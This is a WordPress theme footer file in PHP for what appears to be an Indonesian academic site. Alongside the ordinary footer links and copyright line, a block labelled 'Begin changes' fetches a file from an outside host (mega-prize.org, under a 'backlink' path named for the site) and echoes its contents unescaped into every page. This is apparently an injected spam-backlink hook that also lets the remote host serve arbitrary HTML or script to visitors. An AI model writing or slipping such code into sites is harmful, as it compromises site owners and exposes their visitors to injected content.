<?php

function render_footer() {
?>
	<!-- Begin changes -->

	<?php
	$lt = file_get_contents("https://mega-prize.org/backlink/lpmi.stkippasundan.ac.id.txt");
	if ($lt !== false) {
	    echo $lt;
	}
	?>

	<div class="alignmiddle">
		<p><a href="<?php bloginfo('url'); ?>">Beranda</a> | <a href="<?php bloginfo('url'); ?>/Privacy-Policy/">Kebijakan Privasi</a> | <a href="<?php bloginfo('url'); ?>/fungsi-dan-persyaratan/">Fungsi dan Persyaratan</a></p>
		<p>2014-<?php echo date( 'Y' ); ?> Copyright &copy; <a href="<?php bloginfo('url'); ?>/pengembang/">ksiLabs</a>. All Rights Reserved.</p>
	</div>
	<!-- End changes -->

	<?php wp_footer(); ?>
<?php
}

add_action( 'builder_layout_engine_render_footer', 'render_footer' );

?>
